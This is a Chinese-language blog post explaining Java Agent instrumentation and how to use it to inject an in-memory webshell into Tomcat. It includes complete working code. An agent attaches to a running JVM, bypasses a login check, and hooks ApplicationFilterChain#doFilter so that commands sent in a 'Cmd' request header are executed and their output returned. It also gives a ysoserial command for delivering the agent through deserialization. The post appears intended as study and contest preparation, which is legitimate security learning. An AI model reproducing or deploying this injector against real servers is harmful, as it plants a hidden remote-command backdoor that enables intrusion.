---
layout: post
title: javaagent内存马
categories: [blog ]
tags: [Java,]
description: "javaagent内存马"
image:
  feature: /img/Zero.png
  credit: Azeril
  creditlink: azeril.com
---

















## 前言

```java
前几天为了复现安恒RASP月赛那个题目学习了一下RASP和javaagent，javaagent有二种模式一种premain、一种agentmain，分别是加载在main之后和之前，然后通过生成的jar包就可以运行看效果。
```

（先猜测一下内存马在以上二个模式的方法中，然后依然会通过jar包运行）

## 介绍

Java Agent 简单来说就是JVM提供的一种动态hook class字节码的技术

通过Instrumentation(Java Agent API),开发者能够以一种无侵入的方式，在JVM加载某个class之前修改字节码的内容，同时也支持重加载已经被加载过的class

Java Agent 目前有两种使用方式

1. 通过 `-javaagent` 参数指定 agent, 从而在 JVM 启动之前修改 class 内容 (自 JDK 1.5)
2. 通过 `VirtualMachine.attach()` 方法, 将 agent 附加在启动后的 JVM 进程中, 进而动态修改 class 内容 (自 JDK 1.6)

两种方式分别需要实现 premain 和 agentmain 方法, 而这些方法又有如下四种签名

```java
public static void agentmain(String agentArgs, Instrumentation inst);
public static void agentmain(String agentArgs);
public static void premain(String agentArgs, Instrumentation inst);
public static void premain(String agentArgs);
```

其中带有 `Instrumentation inst` 参数的方法优先级更高, 会优先被调用

premain方式和agentmain方式上篇文章写到了（就不重复了）

### Instrumentation 修改字节码

Instrumentation 就是 Java Agent 提供 给我们的用于修改class字节码的API

常用的方法

```java
// 获取已被 JVM 加载的所有 class
Class[] getAllLoadedClasses();

// 添加 transformer 用于拦截即将被加载或重加载的 class, canRetransform 参数用于指定能否利用该 transformer 重加载某个 class
void addTransformer(ClassFileTransformer transformer, boolean canRetransform);

// 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class
void retransformClasses(Class<?>... classes);
```

添加的transformer必须要实现ClassFileTransformer 接口

```java
public interface ClassFileTransformer {
    byte[]
    transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer)
        throws IllegalClassFormatException;
}
```

className 是 JVM 形式的 class name, 例如 `java.util.HashMap` 在 JVM 中的形式为 `java/util/HashMap` (`.` 被替换成了 `/`)

classfileBuffer 是原始的 class 字节码, 如果我们不想修改某个 class 就需要把这个变量原样返回

剩下的参数一般用不到

为了演示修改字节码这个过程, 先准备一个测试程序

#### 1、首先需要我们生成agentmain的jar包

CrackCrack.java

```java
package com.example;
import javassist.*;
import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;
public class CrackCrack {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        for(Class clazz : inst.getAllLoadedClasses()){ // 先获取到所有已加载的 class
            if (clazz.getName().equals("com.example.CrackTest")){
                //首先遍历了所有的class类，找要和修改的类名称一致
                inst.addTransformer(new TransformerDemo(), true); // 添加 transformer
                inst.retransformClasses(clazz); // 重加载该 class
            }
        }
    }
}
class TransformerDemo implements ClassFileTransformer{
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("com/example/CrackTest")) { // 因为 transformer 会拦截所有待加载的 class, 所以需要先检查一下 className 是否匹配
            try {
                ClassPool pool = ClassPool.getDefault();
                CtClass clazz = pool.get("com.example.CrackTest");
                CtMethod method = clazz.getDeclaredMethod("checkLogin");
                method.setBody("{System.out.println(\"inject success!!!\"); return true;}"); // 利用 Javaassist 修改指定方法的代码
                byte[] code = clazz.toBytecode();
                clazz.detach();
                return code;
            } catch (Exception e) {
                e.printStackTrace();
                return classfileBuffer;
            }
        } else {
            return classfileBuffer;
        }
    }
}
```

然后再

resources/META-INF创建一个MF文件

```java
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: com.example.CrackCrack
```

```java
jar cvfm DDD.jar JYcxk.mf ..\com\example\CrackCrack.class  生成jar包
```

### 2、把jar包加载到我们的main程序中

 这里我没有手动导入tools这个包，而是用程序导入的（避免了某个机子没有那个依赖）

先运行我们的CrackTest类，然后运行CrackDemo,首先获取main进程id，然后加载jar包

```java
package com.example;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.ProtectionDomain;
import java.util.List;

public class CrackDemo {

    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        File toolspath=new java.io.File(System.getProperty("java.home").replace("jre","lib")+ File.separator+"tools.jar");
        //C:\Program Files\Java\jdk1.8.0_65\lib\tools.jar
        URL url=toolspath.toURL();
        //file:/C:/Program Files/Java/jdk1.8.0_65/lib/tools.jar
        URLClassLoader classLoader=new URLClassLoader(new URL[]{url});//记载tools.jar包
        Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
        Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");

        Method listMethod = MyVirtualMachine.getDeclaredMethod("list");//获取list这个方法
        List<Object> list = (List<Object>) listMethod.invoke(MyVirtualMachine);//invoke执行这个方法

        for (Object o : list) {
            Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName");//获取名字 包.类名 在虚拟进程中存在的
            String name = (String) displayName.invoke(o);//执行这个方法
            System.out.println(name);//打印输出

            if (name.contains("co")) {//如果包含我们 要修改的那个进程
                Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id");//获得id方法
                Method attach = MyVirtualMachine.getDeclaredMethod("attach", String.class);
                String id = (String) getId.invoke(o);//这里会得到id进程号
                Object vm = attach.invoke(o, id);//执行attach进程方法


                Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent", String.class);
                //加载进程 loadAgent方法
                loadAgent.invoke(vm, "K:\\javafile\\Instrumentation\\target\\classes\\META-INF\\DDcxk.jar");
                //参数是string类型
                Method detach = MyVirtualMachine.getDeclaredMethod("detach");
                detach.invoke(vm);
            }
    }}
}
```

```java
package com.example;

import java.lang.instrument.Instrumentation;
public class CrackTest {
    public static String username = "admin";
    public static String password = "fakepassword";

    public static boolean checkLogin(){
        if (username == "admin" && password == "admin"){
            return true;
        } else {
            return false;
        }
    }
    public static void main(String[] args) throws Exception{
        while(true){
            if (checkLogin()){
                System.out.println("login success");
            } else {
                System.out.println("login failed");
            }
            Thread.sleep(1000);
        }
    }
}

```

可以看到修改了我们原来的程序

![image-20231114112348329](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231114112348329.png)

## 利用Java Agent注入内存马

根据 Java Agent 的实现原理我们很容易就能把它应用到内存马这个方面

实现的思路就是找一个比较通用的类, 保证每一次 request 请求都能调用到它的某一个方法, 然后利用 Javaassist 插入恶意 Java 代码

这里先以网上讨论比较多的 `org.apache.catalina.core.ApplicationFilterChain#doFilter` 为例

```java
package com.example;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;

public class TomcatAgent {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String args, Instrumentation inst) throws Exception{
        inst.addTransformer(new TomcatTransformer(), true);
    for (Class clazz : inst.getAllLoadedClasses()){
        if (clazz.getName().equals(CLASSNAME)) {
            inst.retransformClasses(clazz);
        }
    }
    }

    public static void main(String[] args) throws Exception{
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor desc : list){
            String name = desc.displayName();
            String pid = desc.id();

            if (name.contains("org.apache.catalina.startup.Bootstrap")){
//            if (name.contains("com.example.springbootdemo.SpringBootDemoApplication")){
                VirtualMachine vm = VirtualMachine.attach(pid);
                String path = new File("JavaAgentDemo.jar").getAbsolutePath();
                vm.loadAgent(path);
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }
}

class TomcatTransformer implements ClassFileTransformer{
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String CLASSMETHOD = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            ClassPool pool = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                pool.insertClassPath(ccp);
            }
            if (className.replace("/", ".").equals(CLASSNAME)) {
                CtClass clazz = pool.get(CLASSNAME);
                CtMethod method = clazz.getDeclaredMethod(CLASSMETHOD);
                method.insertBefore("javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n" +
                        "String cmd = httpServletRequest.getHeader(\"Cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "    java.io.InputStream input = process.getInputStream();\n" +
                        "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n" +
                        "    StringBuilder sb = new StringBuilder();\n" +
                        "    String line = null;\n" +
                        "    while ((line = br.readLine()) != null){\n" +
                        "        sb.append(line + \"\\n\");\n" +
                        "    }\n" +
                        "    br.close();\n" +
                        "    input.close();\n" +
                        "    response.getOutputStream().print(sb.toString());\n" +
                        "    response.getOutputStream().flush();\n" +
                        "    response.getOutputStream().close();\n" +
                        "}");
                byte[] classbyte = clazz.toBytecode();
                clazz.detach();
                return classbyte;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return classfileBuffer;
    }
}
```

上面这个doFilter 方法会调用很多次，也就会弹出很多次计算器

所以正确的做法是去 hook 某个在一次 request 请求中只会被调用一次的方法, 例如 `org.apache.catalina.core.StandardWrapperValve#invoke`

```java
这个内存马挺鸡肋的，因为只有agent.jar包在服务器存在才行（比如提供了一个文件上传的接口）
然后搞一个反序列化比如 templates中的恶意类的代码换成这个 找端口加载agent.jar，也是可以的，但实际环境几乎没有。
```



http://wjlshare.com/archives/1582

参考这篇文章，是构造了一个反序列化的元素

在最后构造链子的时候报错了

```java
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11 codefile:./TestAgentMain.java > cc11demo.ser
```

![image-20231114153610044](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231114153610044.png)
